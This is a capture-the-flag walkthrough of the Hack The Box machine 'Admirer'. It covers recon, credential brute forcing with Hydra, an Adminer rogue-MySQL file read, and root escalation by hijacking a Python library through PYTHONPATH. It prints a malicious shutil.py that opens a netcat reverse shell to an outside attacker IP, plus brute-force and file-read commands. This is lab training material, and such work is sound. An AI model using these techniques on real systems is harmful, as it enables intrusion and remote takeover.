---
title: "Admirer"
difficulty: Easy
os: Linux
points: 20
rating: 3.5
date: 2020-05-02
avatar: assets/htb/admirer.png
tags: [Arbitrary File Read, Path Hijacking, Reconnaissance, SUDO Exploitation, PHP, Bash, Apache, MariaDB]
htb_url: https://app.hackthebox.com/machines/Admirer
---
## Overview

This easy Linux box features a clever database-manipulation trick that yields a local file inclusion vulnerability.  It also showed me a new-to-me method of abusing sudo privileges for privilege escalation.  Overall, an enjoyable machine that taught me a couple of fresh techniques!

## Enumeration

### Nmap scan

I kicked off enumeration with an nmap scan of `<YOUR_IP>`. The flags I typically rely on are: `-p-`, a shorthand that instructs nmap to scan every port, `-sC`, which is equivalent to `--script=default` and launches nmap's default set of enumeration scripts against the host, `-sV` for service detection, and `-oA <name>` to save the output under the filename `<name>`.

```text
kac0@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 14:20 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.057s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)                                      
80/tcp open  http    Apache httpd 2.4.25 ((Debian))                                                   
| http-robots.txt: 1 disallowed entry                                                                 
|_/admin-dir                                                                                          
|_http-server-header: Apache/2.4.25 (Debian)                                                          
|_http-title: Admirer                                                                                  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .        
Nmap done: 1 IP address (1 host up) scanned in 51.54 seconds
```

The scan results showed that just three ports were open: 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\).  

```text
kac0@kali:~/htb/admirer$ ftp <YOUR_IP>                                                      
Connected to <YOUR_IP>.                                                                           
220 (vsFTPd 3.0.3)                                                                                   
Name (<YOUR_IP>:kac0): anonymous                                                               
530 Permission denied.                                                                               
Login failed.
```

My first move was to attempt an FTP login, but anonymous access was rejected.

![](assets/wu/admirer/img-1.png)

Next I pointed a browser at the HTTP service to see what was hosted there, landing on a site belonging to someone who described themselves as an "Admirer of skills and visuals".  Nothing on the page itself looked useful.

### robots.txt

![](assets/wu/admirer/img-2.png)

Since nmap had flagged a `robots.txt` file, I took a look.  It revealed a likely username `waldo` along with a folder named `admin-dir`.  

![](assets/wu/admirer/img-3.png)

Browsing straight to that page returned a forbidden error, so I launched Dirbuster against the directory.  That turned up a couple of promising files: `contacts.txt` and `credentials.txt`. 

```text
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

`contacts.txt` held additional candidate usernames and revealed the email address format in use. I also spotted that `waldo` appeared to be a fan of The Big Bang Theory, another detail that might come in handy. 

```text
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

`credentials.txt` listed logins for several services, which I dropped into my `users` and `passwords` files.  

## Initial Foothold

I then turned to `hydra` to brute-force SSH and check whether any of the collected credentials would grant a login.

```text
kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 15:40:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:10/p:3), ~2 tries per task
[DATA] attacking ssh://<YOUR_IP>:22/
[22][ssh] host: <YOUR_IP>   login: ftpuser   password: %n?4Wz}R$tTF7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:38
```

The FTP credentials worked over SSH too! Unfortunately, the session was dropped the instant I logged in.  After several unsuccessful attempts to get around this, I shifted to using the credentials against FTP itself.

```text
kac0@kali:~/htb/admirer$ ftp <YOUR_IP>
Connected to <YOUR_IP>.
220 (vsFTPd 3.0.3)
Name (<YOUR_IP>:kac0): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```

The ftp credentials let me into the FTP server.  I spotted a couple of interesting files and pulled them back to my box for analysis.

### The database backup

![](assets/wu/admirer/img-4.png)

`dump.sql` was a dump of the site's database. The only worthwhile details, though, looked to be the server version, the database name, and the name of a deleted table that appeared to hold website files. I figured that might prove useful later, so I jotted it down.

* **Database:** admirerdb
* **Table**: items \(deleted\)
* **Version**: MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu \(x86\_64\)

![](assets/wu/admirer/img-5.png)

The `Employees3` table held yet another set of candidate usernames and email addresses, which I appended to my lists.

### Back-end code backup

![](assets/wu/admirer/img-6.png)

Once I had fully reviewed the database, I turned to `html.tar.gz`. Extracting the tar archive with `gunzip` revealed a backup of the site's back-end code, including a particularly interesting PHP file named `admin_tasks.php` under the `/utility-scripts/` folder. 

![](assets/wu/admirer/img-7.png)

This file looked like a handy little backdoor the admin had conveniently left behind, dubbed the "Admin Tasks Web Interface \(v0.01 beta\)". Options 4 through 7 caught my eye, as they might hand over highly sensitive system information.  

![](assets/wu/admirer/img-8.png)

The same folder held `db_admin.php`, which carried yet another set of credentials, this time for the user `waldo` I had earlier seen in `robots.txt`. 

![](assets/wu/admirer/img-9.png)

The `index.php` file also held another password for `waldo`.  It referenced the `items` table too, the one that had been deleted from the database I downloaded.  If I could plant a web shell into that table, the page would execute it for me on load.

```text
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
```

The HTML backup also contained a different copy of `robots.txt`.  Here the disallowed folder was `/w4ld0s_s3cr3t_d1r/`, which I could access directly as a folder within the backup.  Inside it sat `contacts.txt` and `credentials.txt`, which at first glance looked identical to the earlier ones.

```text
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

This `credentials.txt` largely repeated the earlier content, except `waldo` had apparently left his bank account password in this version.  Even with these extra passwords in hand, none of them logged in over SSH for any user.

![](assets/wu/admirer/img-10.png)

Browsing to `http://<YOUR_IP>/utility-scripts/admin_tasks.php` landed me on a page for running administrative tasks against the server.  

![](assets/wu/admirer/img-11.png)

There wasn't much of value here beyond confirming that the page ran as the `www-data` user. 

![](assets/wu/admirer/img-12.png)

Attempting to invoke the disabled scripts just returned the message:  `Insufficient privileges to perform the selected operation.`

![](assets/wu/admirer/img-13.png)

Returning to my Dirbuster scan of the `/utility-scripts/` folder, I saw it had discovered a new page, `adminer.php`, which hosted an Adminer database management portal. 

![](assets/wu/admirer/img-14.png)

The version showed as 4.6.2, with a note right beside it that version 4.7.7 was available for download. Searching for an adminer 4.6.2 exploit led me to [https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). That pointed to [https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw), which in turn referenced a MySQL exploit on GitHub at [https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue\_mysql\_server.py](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py).  A few additional references rounded out a clear understanding of how to attack this web-based SQL management portal.

* [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) 
* [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)

In short, the simplest path to exploiting this portal is to stand up a local MySQL database and make the remote server connect back to it.  I located setup instructions at [https://www.microfocus.com/documentation/idol/IDOL\_12\_0/MediaServer/Guides/html/English/Content/Getting\_Started/Configure/\_TRN\_Set\_up\_MySQL\_Linux.htm](https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm)

## Road to User

### The rogue MySQL server

I dug a little deeper to work out exactly how to configure the MySQL database.  The articles below filled in the remaining gaps I wasn't already familiar with \(specifically, creating a user and granting it permissions\).

* [https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/) 
* [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)

```text
kac0@kali:/etc/mysql/conf.d$ service mysql start
kac0@kali:/etc/mysql/conf.d$ sudo su -
root@kali:~# mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 52
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database admirer
    -> CHARACTER SET utf8 COLLATE utf8_unicode_ci;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| admirer            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]> create user 'test' identified by 'test';
Query OK, 0 rows affected (0.000 sec)
MariaDB [(none)]> grant all on *.* to 'test';
Query OK, 0 rows affected (0.000 sec)
MariaDB [(none)]> commit;
Query OK, 0 rows affected (0.000 sec)
MariaDB [(none)]> use admirer
Database changed
MariaDB [admirer]> create table test(users varchar(255));
Query OK, 0 rows affected (0.005 sec)
MariaDB [admirer]> commit;
Query OK, 0 rows affected (0.000 sec)
MariaDB [admirer]> exit
Bye
root@kalimaa:~# exit
logout
```

Having created the database and a table called `admirer`, I added a user named `test` and granted it full rights to manage the database.  

```text
kac0@kali:/etc/mysql/mariadb.conf.d$ ls
50-client.cnf  50-mysql-clients.cnf  50-mysqld_safe.cnf  50-server.cnf
kac0@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
```

![](assets/wu/admirer/img-15.png)

Next I needed to bind the server to `0.0.0.0` so the remote service could reach it via my IP.  The default `127.0.0.1` only listens on localhost.

```text
kac0@kali:/etc/mysql/conf.d$ service mysql stop
kac0@kali:/etc/mysql/conf.d$ service mysql start
```

After switching the server's `bind-address` to `0.0.0.0`, I restarted the `mysql` service so the change would take effect. From there I could log into my database through the Adminer portal.

![](assets/wu/admirer/fix-18.png)

### Finding user creds

This bug bounty write-up laid out the next steps. In essence, I used the remote server's database management portal but connected it to my own local database.  Then I abused a MySQL feature that imports local files into the database, which is effectively a local file inclusion \(LFI\) vulnerability.  

* [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)

```text
LOAD DATA LOCAL INFILE '/etc/passwd' 
INTO TABLE admirer.test
FIELDS TERMINATED BY "\n"
```

![](assets/wu/admirer/fix-19.png)

To test the local file inclusion, I first went after `/etc/passwd` but was denied access to it. Reasonably confident the portal was still running as `www-data`, I switched to a file I knew I could read: `index.php`.

![](assets/wu/admirer/img-18.png)

I wasn't certain it would work, but to my surprise the file was pulled in and stored in my database. I now had a way to read the live production website's source code rather than just the backups I'd downloaded earlier.

![](assets/wu/admirer/img-19.png)

Much to my surprise...this file held yet another password. Before grabbing any more files, I decided to retry the SSH brute force with this newly found password.

```text
kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:11/p:7), ~5 tries per task
[DATA] attacking ssh://<YOUR_IP>:22/
[22][ssh] host: <YOUR_IP>   login: ftpuser   password: %n?4Wz}R$tTF7
[22][ssh] host: <YOUR_IP>   login: waldo   password: &<h5b~yK3F#{PaPB&dA}{H>
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 22:50:00
```

At last I had a working password for `waldo`!  I just hoped it wouldn't immediately disconnect me the way it had with `ftpuser`. 

### User.txt

```text
kac0@kali:~/htb/admirer$ ssh waldo@<YOUR_IP>
waldo@<YOUR_IP>'s password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3

waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
e9d4************************af9a
```

Fortunately it let me straight in, and I could finally grab my hard-earned loot!

## Path to Power \(Gaining Administrator Access\)

### Enumeration as user `waldo`

```bash
waldo@admirer:~$ id && hostname
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
admirer
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

One of my first habits after landing on a new user is to run `sudo -l` to see what privileges I hold.  I was pleased to find I could do something with a bash script named `admin_tasks.sh`.  Naturally I wanted to know what that script did, and also what the `admins` group had access to.  

```text
waldo@admirer:~$ find / -group admins 2>/dev/null
/opt/scripts
/opt/scripts/backup.py
/opt/scripts/admin_tasks.sh
```

Hmm...so the admins group only has access to that `scripts` folder.  Time to inspect the bash script.

```bash
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi

# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

This bash script looked like a finished counterpart to the PHP admin-tasks page I had seen before.  Within it, a few other files are referenced:

* `/opt/scripts/backup.py`
* `/srv/ftp/dump.sql` - _this is the one I found through the ftp server I think_
* `/var/backups/dump.sql`

```bash
waldo@admirer:/opt/scripts$ sudo ./admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 3
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
```

I selected the option to view the root crontab and saw it was configured to wipe files every 3 minutes.  Clearly, anything placed in `/tmp/`, or any file whose extension begins with `p` in `waldo`'s home directory, wouldn't last long.  

```text
waldo@admirer:/opt/scripts$ ls -la /var/backups/
total 6472
drwxr-xr-x  2 root root      4096 Sep 27 23:38 .
drwxr-xr-x 12 root root      4096 Nov 29  2019 ..
-rw-r--r--  1 root root     40960 Apr 22 11:32 alternatives.tar.0
-rw-r--r--  1 root root      2156 Nov 29  2019 alternatives.tar.1.gz
-rw-r--r--  1 root root     13080 Apr 16 13:29 apt.extended_states.0
-rw-r--r--  1 root root      1461 Nov 29  2019 apt.extended_states.1.gz
-rw-r--r--  1 root root       280 Nov 29  2019 dpkg.diversions.0
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.1.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.2.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.3.gz
-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.4.gz
-rw-r--r--  1 root root       218 Nov 29  2019 dpkg.statoverride.0
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.1.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.2.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.3.gz
-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.4.gz
-rw-r--r--  1 root root    422248 Apr 16 13:30 dpkg.status.0
-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.1.gz
-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.2.gz
-rw-r--r--  1 root root    123388 Dec  1  2019 dpkg.status.3.gz
-rw-r--r--  1 root root    122709 Nov 29  2019 dpkg.status.4.gz
-rw-r--r--  1 root root      3694 Sep 27 23:38 dump.sql
-rw-------  1 root root       840 Dec  2  2019 group.bak
-rw-------  1 root shadow     691 Dec  2  2019 gshadow.bak
-rw-r--r--  1 root root   5552679 Dec  4  2019 html.tar.gz
-rw-------  1 root root      1680 Dec  2  2019 passwd.bak
-rw-------  1 root shadow    1777 Apr 22 11:42 shadow.bak
```

I could also run the script to back up the SQL database, `/etc/passwd`, and `/etc/shadow`. Unfortunately every resulting backup file was owned by `root`, leaving me no way to read them.  

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

The one function that stood out from the rest was the one backing up the website's HTML files.  It invoked a separate python script that would likewise execute as root, so I decided to examine it too.

```python
!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

The `/opt/scripts/backup.py` file that the bash script called for the web backup contained code that looked potentially exploitable. 

### SETENV and sudo

Since the python script ran as root, I wondered if I could coax it into reading a file of my choosing, but every file path in the script was absolute, so there was no opportunity to hijack them. 

Because the `sudo -l` output showed `SETENV` preceding the bash script I was allowed to run, I researched `sudo setenv python`. Among the results was a compelling article about hijacking python library imports. 

* [https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root](https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root) [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

> SCENARIO 3: Redirecting Python Library Search through PYTHONPATH Environment Variable
>
> The PYTHONPATH environment variable indicates a directory \(or directories\), where Python can search for modules to import.
>
> It can be abused if the user got privileges to set or modify that variable, usually through a script that can run with sudo permissions and got the SETENV tag set into /etc/sudoers file.

That described my situation precisely.

```python
import os

def make_archive():
    os.system('/bin/bash')
    os.system('echo I am g`whoami`')
```

With that in mind, I crafted a small python library to stand in for the one the script imports.  I called it `shutil.py` so the script would load mine instead of the genuine module, and defined a `make_archive()` function since that was the exact name being imported.  My function was written to spawn a bash shell and then echo my new username.  

```python
waldo@admirer:/dev/shm$ vi shutil.py 
waldo@admirer:/dev/shm$ nano shutil.py
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ Traceback (most recent call last):
  File "/opt/scripts/backup.py", line 3, in <module>
    from shutil import make_archive
ImportError: cannot import name 'make_archive'
whoami
waldo
waldo@admirer:/dev/shm$ nano shutil.py
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ Traceback (most recent call last):
  File "/opt/scripts/backup.py", line 12, in <module>
    make_archive(dst, 'gztar', src)
TypeError: make_archive() takes 0 positional arguments but 3 were given
whoami
waldo
waldo@admirer:/dev/shm$ nano shutil.py
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ I am groot
```

After some trial and error, I got my library to load and run, though it didn't drop me into a shell as I'd hoped. Still, the `whoami` output showed up, proving I could execute commands as root. 

The first version of my malicious python library threw an error, but that error was itself a sign of progress. It reported that my `make_archive()` function accepts 0 positional arguments while the calling script was passing it three.

```python
import os

def make_archive(a, b, c):
    os.system('/bin/bash')
    os.system('echo I am g`whoami`'')
    os.system('nc 10.10.15.57 12345 -e /bin/bash')
```

I updated the function to accept 3 arguments \(which I never actually used\) and, since spawning a local shell wasn't working, added a line to fire a reverse shell back to me, after which everything worked smoothly. I hadn't expected the installed `nc` to support `-e`, but I was glad it did!

```python
waldo@admirer:/dev/shm$ nano shutil.py 
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ I am groot
```

### Root.txt

```text
kac0@kali:~$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 60956
whoami
root
cat /root/root.txt
0f4b************************b877
```
